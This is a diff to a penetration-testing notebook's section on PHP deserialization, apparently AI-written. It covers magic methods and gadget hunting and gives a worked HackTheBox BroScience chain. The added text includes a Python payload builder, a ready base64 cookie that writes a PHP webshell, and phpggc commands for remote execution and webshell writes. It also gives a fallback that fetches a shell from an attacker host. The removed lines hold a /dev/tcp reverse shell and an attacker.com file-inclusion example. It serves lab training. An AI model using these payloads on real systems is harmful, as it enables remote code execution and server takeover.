@@ -165,93 +165,353 @@ java -jar gadget-inspector.jar target-app.jar
 
 ## PHP Deserialization
 
-PHP `unserialize()` on untrusted data. Magic methods (`__wakeup`, `__destruct`, `__toString`) execute automatically on deserialization.
+PHP `unserialize()` on untrusted data. Magic methods execute automatically on deserialization — they are the entry point of every PHP gadget chain.
 
-### Identify
+### Magic Methods — Gadget Reference
+
+Full list per the [PHP manual](https://www.php.net/manual/en/language.oop5.magic.php), grouped by how you'd use them.
+
+**Entry points — fire automatically during/after `unserialize()`:**
+
+| Method | Signature | Fires when |
+|---|---|---|
+| `__unserialize()` | `public function __unserialize(array $data): void` | During `unserialize()` — **PHP 7.4+, takes precedence over `__wakeup()`** |
+| `__wakeup()` | `public function __wakeup(): void` | During `unserialize()` — **only if `__unserialize()` is not defined** |
+| `__destruct()` | `__destruct()` | Object is garbage-collected — the most reliable entry point, fires even if nothing touches the object |
+
+**Propagation gadgets — fire when the object is *used*, letting you pivot deeper into a chain:**
+
+| Method | Signature | Fires when |
+|---|---|---|
+| `__toString()` | `public function __toString(): string` | Object used as a string (`echo $obj`, concatenation, `strlen()`) |
+| `__invoke()` | `function __invoke(...$values): mixed` | Object called as a function — `$obj()` |
+| `__call()` | `__call($name, $arguments)` | Inaccessible **instance** method invoked |
+| `__callStatic()` | `__callStatic($name, $arguments)` | Inaccessible **static** method invoked |
+| `__get()` | `__get($name)` | Reading an inaccessible property |
+| `__set()` | `__set($name, $value)` | Writing an inaccessible property |
+| `__isset()` | `__isset($name)` | `isset()` / `empty()` on an inaccessible property |
+| `__unset()` | `__unset($name)` | `unset()` on an inaccessible property |
+| `__clone()` | `__clone()` | Object is cloned |
+
+**Rarely reachable from deserialization, but worth knowing:**
+
+| Method | Fires when |
+|---|---|
+| `__construct()` | Object created — **not** called by `unserialize()`, which is why deserialization bypasses constructor validation |
+| `__serialize()` / `__sleep()` | During `serialize()` — outbound only |
+| `__set_state()` | `var_export()` re-import |
+| `__debugInfo()` | `var_dump()` / `print_r()` |
+
+> [!warning] **`__unserialize()` silently wins over `__wakeup()`.**
+> Since PHP 7.4, if a class defines **both**, only `__unserialize()` runs — `__wakeup()` is ignored entirely. Hunting for `__wakeup` gadgets in a modern codebase will make you miss live chains, and can make you think a class is safe when its `__unserialize()` is the real sink. Same precedence applies outbound: `__serialize()` beats `__sleep()`.
+>
+> As of **PHP 8.5**, `__sleep()` and `__wakeup()` are **soft-deprecated** in favour of the newer pair — expect new code to use `__serialize`/`__unserialize` exclusively.
+
+> [!tip]
+> `__construct()` is **not** invoked by `unserialize()`. That's the core of PHP object injection: you get a fully-populated object that never passed through its own constructor, so any validation or initialisation living there is skipped.
 
 ```bash
-# Look for serialized PHP objects in:
-# - Cookies (base64 or raw)
-# - Hidden form fields (viewstate, data)
-# - GET/POST parameters
+# Grep a source tree for reachable gadget entry points
+grep -rnE 'function\s+__(unserialize|wakeup|destruct|toString|invoke|call|get)\b' --include='*.php' .
 
-# PHP serialized format:
-# O:8:"UserName":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
-# O:<length>:"<classname>":<property_count>:{<properties>}
-
-# Base64 of serialized object will decode to this format
-echo "<cookie_value>" | base64 -d | head -c 100
-
-# Detect: starts with O:, a:, s:, i:, b:, N;
+# Find the sinks that make them reachable
+grep -rnE '\bunserialize\s*\(' --include='*.php' .
 ```
 
-### Object Injection
+### Workflow — you found a serialized blob, now what
+
+```mermaid
+flowchart TD
+    A["Serialized data in a cookie / param"] --> B{"Can you read<br/>the app source?"}
+    B -->|"Yes"| C["PATH A - hand-craft<br/>grep the source for magic methods"]
+    B -->|"No"| D{"Known framework?<br/>Laravel / Symfony / Yii ..."}
+    D -->|"Yes"| E["PATH B - phpggc<br/>pick a chain for that framework"]
+    D -->|"No"| F["Get source first<br/>LFI, .git, backups, php://filter"]
+    F --> B
+    C --> G["Build object, base64, replace the value"]
+    E --> G
+    G --> H{"Did it fire?"}
+    H -->|"No"| I["Check: logged in? right property<br/>visibility? correct string lengths?"]
+    I --> G
+```
+
+**Order of operations. Do these in order — most people skip step 2 and waste an hour.**
+
+1. **Confirm it's serialized and find the sink**
+2. **Get the source if you can** — Path A is faster and more reliable than guessing chains
+3. **Find a magic method that does something useful**
+4. **Build the object**
+5. **Verify it fired**
+
+---
+
+### Step 1 — Confirm it's serialized, find the sink
 
 ```bash
-# If app deserializes and class has useful magic methods:
+# Decode the candidate value
+echo '<cookie_value>' | base64 -d
 
-# Example vulnerable class:
-# class Config {
-#   public $template = "default";
-#   public function __destruct() {
-#     include($this->template);  # <-- LFI/RFI
-#   }
-# }
+# Serialized PHP starts with a type token:
+#   O:<len>:"<ClassName>":<n>:{...}   object
+#   a:<n>:{...}                        array
+#   s:<len>:"..."                      string
+#   i:<int>;  b:0|1;  d:<float>;  N;   scalar / null
+```
 
-# Craft malicious serialized object:
-python3 << 'EOF'
-# PHP serialization format builder
-classname = "Config"
-props = {"template": "/etc/passwd"}  # or "http://attacker.com/shell.php"
+With source, find the sink directly — this is the single highest-value grep:
 
-def php_serialize_str(s):
-    return f's:{len(s)}:"{s}";'
+```bash
+grep -rnE '\bunserialize\s*\(' --include='*.php' .
+# Then read the surrounding function: what guards it? (session? auth?)
+```
 
-def php_serialize_obj(cls, properties):
-    props_serial = ""
-    for k, v in properties.items():
-        props_serial += php_serialize_str(k) + php_serialize_str(v)
-    return f'O:{len(cls)}:"{cls}":{len(properties)}:{{{props_serial}}}'
+> [!warning]
+> **Check the guard around the sink.** If it sits behind `isset($_SESSION['id'])` you must be *logged in* or the code returns before reaching `unserialize()` and your payload never fires. This is the most common reason a correct payload "does nothing".
 
-payload = php_serialize_obj(classname, props)
-print(payload)
+---
+
+### Step 2 — Find the gadget (Path A: you have source)
+
+You need a magic method reachable from `unserialize()` that reaches a dangerous function.
+
+```bash
+# Every magic method in the codebase
+grep -rnE 'function\s+__(unserialize|wakeup|destruct|toString|invoke|call|callStatic|get|set)\b' --include='*.php' .
+
+# What do they reach? Look for sinks inside those methods
+grep -rnE '\b(system|exec|shell_exec|passthru|popen|proc_open|eval|assert|include|require|file_put_contents|fwrite|fopen|unlink|file_get_contents|call_user_func)\s*\(' --include='*.php' .
+```
+
+Any of these inside a magic method is a chain:
+
+| Sink reached | Gives you |
+|---|---|
+| `system` / `exec` / `passthru` / `popen` | Direct RCE |
+| `eval` / `assert` / `call_user_func` | Direct RCE |
+| `include` / `require` | LFI → RCE (log poison, `data://`, uploaded file) |
+| `fwrite` / `file_put_contents` | **Arbitrary file write → drop a webshell** |
+| `unlink` | File delete — DoS, or remove a lock/config to bypass logic |
+| `file_get_contents` on a controlled path | File read / SSRF |
+
+> [!tip]
+> A file **write** is as good as RCE on a PHP box — write a shell into the web root. Don't skip past `fwrite`/`fopen` looking for `system()`.
+
+---
+
+### Step 3 — Build the object
+
+The properties you set are just the object's fields. Get the **visibility** right or the payload silently fails:
+
+| Declared as | Serializes the property name as | In the raw string |
+|---|---|---|
+| `public $x` | `x` | `s:1:"x";` |
+| `protected $x` | `\0*\0x` | `s:4:"\0*\0x";` — length **+3** |
+| `private $x` | `\0ClassName\0x` | length **+ strlen(class) + 2** |
+
+> [!warning]
+> **The null-byte trap.** `\0` here is a literal NUL byte, not a backslash-zero. Hand-editing a payload with private/protected properties in a text editor will corrupt it — the `s:` length must count those NUL bytes. Always generate the string with a script, and never hand-adjust lengths after editing a value.
+
+**Reusable builder** — handles nesting, ints, arrays, and visibility:
+
+```python
+#!/usr/bin/env python3
 import base64
+
+def ser(v):
+    if isinstance(v, str):   b = v.encode(); return f's:{len(b)}:"{v}";'
+    if isinstance(v, bool):  return f'b:{int(v)};'
+    if isinstance(v, int):   return f'i:{v};'
+    if isinstance(v, float): return f'd:{v};'
+    if v is None:            return 'N;'
+    if isinstance(v, list):
+        body = "".join(ser(i) + ser(x) for i, x in enumerate(v))
+        return f'a:{len(v)}:{{{body}}}'
+    if isinstance(v, dict):
+        body = "".join(ser(k) + ser(x) for k, x in v.items())
+        return f'a:{len(v)}:{{{body}}}'
+    raise TypeError(v)
+
+def obj(cls, props, visibility=None):
+    """visibility: {'prop': 'private'|'protected'} — public is the default."""
+    visibility = visibility or {}
+    body = ""
+    for k, v in props.items():
+        vis = visibility.get(k, "public")
+        name = k if vis == "public" else (f"\0*\0{k}" if vis == "protected" else f"\0{cls}\0{k}")
+        body += ser(name) + ser(v)
+    return f'O:{len(cls)}:"{cls}":{len(props)}:{{{body}}}'
+
+# --- edit below ---
+payload = obj("ClassName", {"prop": "value"})
+print(payload)
 print(base64.b64encode(payload.encode()).decode())
-EOF
-
-# Send in cookie or parameter
-curl -s "http://<target>/page" -b "data=$(python3 -c "import base64; print(base64.b64encode(b'O:6:\"Config\":1:{s:8:\"template\";s:11:\"/etc/passwd\";}').decode())")"
-```
-
-### phpggc — PHP Gadget Chains
-
-```bash
-# Install
-git clone https://github.com/ambionics/phpggc
-cd phpggc
-
-# List available gadget chains
-./phpggc -l
-./phpggc -l | grep -i "laravel\|symfony\|yii\|magento\|wordpress"
-
-# Generate payload — RCE via Laravel
-./phpggc Laravel/RCE1 system 'id'
-./phpggc Laravel/RCE5 system 'id' -b   # base64 encoded
-./phpggc Laravel/RCE5 "bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'" -b
-
-# Common frameworks and chains:
-./phpggc Symfony/RCE1 system 'id' -b
-./phpggc Guzzle/FW1 /var/www/html/shell.php '<?php system($_GET["c"]);?>' -b
-./phpggc Yii/RCE1 system 'id' -b
-./phpggc WordPress/RCE1 system 'id' -b
-
-# Send payload
-PAYLOAD=$(./phpggc Laravel/RCE5 system 'id' -b)
-curl -s "http://<target>/vulnerable" -d "data=$PAYLOAD"
 ```
 
 ---
 
+### Why any class is fair game (the key mental shift)
+
+`unserialize()` does not *parse data into a declared type* — it **constructs an object of whatever class the bytes name**. The class name is embedded in the payload, so the variable's apparent type at the sink is irrelevant:
+
+```php
+$up = unserialize(base64_decode($cookie));   // "obviously" a UserPrefs
+return $up->theme;                           // ...but you decide the class
+```
+
+**Any class loaded in that request's scope is reachable**, whether or not the feature using it is finished, reachable, or even referenced. That is the whole game: you're not tampering with values, you're choosing which constructor-equivalent runs.
+
+```bash
+# So the real question is: what's in scope at the sink?
+# Trace the includes — anything pulled in on that request is fair game.
+grep -rn "require\|include" --include='*.php' . | grep -v "//"
+```
+
+> [!tip] **Hunt the dead code.** Half-built and abandoned features are the richest gadget source — the classes still load, but nobody hardened them because nothing calls them. Tells:
+> - `<!-- TODO: ... -->` markers in templates
+> - A setter defined but called from nowhere
+> - Orphaned assets (an unreferenced `dark.css`, an unused upload dir)
+> - Classes in a shared `utils.php`/`functions.php` that the current UI never touches
+>
+> In BroScience the entire `Avatar`/`AvatarInterface` pair is dead code behind a `<!-- TODO: Avatars -->` stub — and it's the whole exploit.
+
+---
+
+### Worked example — HTB BroScience
+
+Real chain, end to end — **verified working 2026-08-18**, webshell obtained. Shows the shape you're looking for.
+
+**Step 0 — record the baseline.** Before crafting anything, grab the value the server mints itself. It confirms the format, the class name, and that nothing is signed:
+
+```bash
+echo 'Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NToibGlnaHQiO30=' | base64 -d
+# O:9:"UserPrefs":1:{s:5:"theme";s:5:"light";}
+```
+
+No HMAC, no signature, no integrity check anywhere on the cookie — so the value is fully attacker-controlled.
+
+**The sink** (`includes/utils.php`) — note the session guard:
+
+```php
+function get_theme() {
+    if (isset($_SESSION['id'])) {                       // <-- must be logged in
+        ...
+        $up = unserialize(base64_decode($up_cookie));   // <-- sink, cookie: user-prefs
+        return $up->theme;
+```
+
+> [!warning]
+> **The gate can be its own vuln chain.** On BroScience the sink needs a session, and the only route to one is registering an account then predicting its activation code — `generate_activation_code()` uses `srand(time())`, and the server publishes `time()` in the `Date:` response header. Two separate bugs, and the deserialization is unreachable without the first. When a sink is gated, treat the gate as a target rather than assuming the sink is out of reach. Predictable-token techniques: [[Class notes/HTB Academy/CWES Claude/Broken Auth|Broken Auth]].
+
+**The gadget** — the app's only magic method:
+
+```php
+class AvatarInterface {
+    public $tmp;
+    public $imgPath;
+    public function __wakeup() {                 // fires on unserialize
+        $a = new Avatar($this->imgPath);
+        $a->save($this->tmp);
+    }
+}
+class Avatar {
+    public function save($tmp) {
+        $f = fopen($this->imgPath, "w");         // attacker-controlled destination
+        fwrite($f, file_get_contents($tmp));     // attacker-controlled content
+    }
+}
+```
+
+`file_get_contents()` accepts URLs and stream wrappers → arbitrary file write with arbitrary content → webshell in the web root. Both properties are `public`, so no NUL mangling.
+
+```python
+payload = obj("AvatarInterface", {
+    "tmp":     "data://text/plain,<?php system($_GET[0]); ?>",
+    "imgPath": "/var/www/html/sh.php",
+})
+```
+
+```bash
+# Log in first, then replace the user-prefs cookie and hit any page that renders the theme.
+# navbar.php calls get_theme_class() -> get_theme(), and navbar is included everywhere,
+# so essentially ANY authenticated page fires the gadget.
+curl -sk "https://broscience.htb/index.php" \
+  -b "PHPSESSID=<your-session>; user-prefs=<base64-payload>"
+
+# Collect
+curl -sk "https://broscience.htb/sh.php?0=id"
+```
+
+Ready-made for this box (`data://` variant, no listener needed):
+
+```
+TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czo0NDoiZGF0YTovL3RleHQvcGxhaW4sPD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4iO3M6NzoiaW1nUGF0aCI7czoyMDoiL3Zhci93d3cvaHRtbC9zaC5waHAiO30=
+```
+
+`data://` keeps the shell body inside the cookie — no listener needed. If `allow_url_include` is off, fall back to `http://<attacker-ip>/shell.php`, which only needs `allow_url_fopen` (on by default).
+
+> [!note]
+> `$_GET[0]` uses a **numeric** key deliberately. A bare `$_GET[cmd]` is a fatal `Error` on PHP 8, and quoting it collides with the surrounding quotes. See [[SQL Injection]] for the same trap in webshell writes.
+
+---
+
+### Step 4 — Verify it fired
+
+Blind is common — the app may render nothing different.
+
+```bash
+# 1. Cheapest: aim the gadget at something observable
+#    file write  -> request the file you wrote
+#    file_get_contents / SSRF -> point it at your listener
+nc -lvnp 8000
+
+# 2. Error-based: a deliberately broken value often surfaces the class name
+#    e.g. set imgPath to an unwritable path and watch for a PHP warning
+
+# 3. Timing: if a chain reaches sleep/exec, compare response times
+```
+
+If nothing happens, work down this list — in practice it's almost always the first two:
+
+1. **Not authenticated** — the sink sits behind a session check
+2. **Wrong property visibility** — private/protected needs the NUL prefix
+3. **String lengths wrong** — you edited a value by hand and didn't fix `s:<len>:`
+4. **`__unserialize()` exists** and is shadowing the `__wakeup()` you targeted
+5. **Class not in scope** at the point of the `unserialize()` call (no autoloader reach)
+
+---
+
+### Path B — no source, known framework (phpggc)
+
+```bash
+git clone https://github.com/ambionics/phpggc && cd phpggc
+
+# Fingerprint first — cookies, headers, paths, 404 page all leak the framework
+./phpggc -l | grep -i "laravel\|symfony\|yii\|magento\|wordpress\|guzzle\|monolog"
+```
+
+Picking a chain — the naming tells you what it does:
+
+| Suffix | Effect | When to use |
+|---|---|---|
+| `/RCE*` | Command execution | First choice |
+| `/FW*` | File write | RCE blocked, or you want a webshell |
+| `/FD*` | File delete | Bypass a lock/config check |
+| `/FR*` | File read | Blind targets — exfil config for creds |
+| `/SQLI*` | SQL injection via the chain | Rare, situational |
+
+```bash
+./phpggc Laravel/RCE1 system 'id'
+./phpggc Laravel/RCE13 system 'id' -b                       # -b = base64
+./phpggc Guzzle/FW1 /var/www/html/sh.php '<?php system($_GET[0]);?>' -b
+./phpggc Monolog/RCE1 system 'id' -b
+
+# Send it
+PAYLOAD=$(./phpggc Laravel/RCE13 system 'id' -b)
+curl -s "http://<target>/vulnerable" -d "data=$PAYLOAD"
+```
+
+> [!tip]
+> Chains are **version-specific**. `Laravel/RCE1` through `RCE15+` target different releases — if one fails that is not proof the sink is safe. Work through every chain for the framework before concluding it isn't exploitable, and check the framework version in `composer.lock` or `/vendor` if you can reach it.
 ## .NET Deserialization
 
 .NET uses `BinaryFormatter`, `ObjectStateFormatter`, `LosFormatter`, `NetDataContractSerializer`, `JavaScriptSerializer`, `XmlSerializer`, and `Json.NET`. ViewState is a common vector.
@@ -477,5 +737,5 @@ curl -s -X POST "http://<target>/api" --data-binary @ping.ser
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-07-30*
+*Updated: 2026-08-18*
 *Model: claude-opus-5*
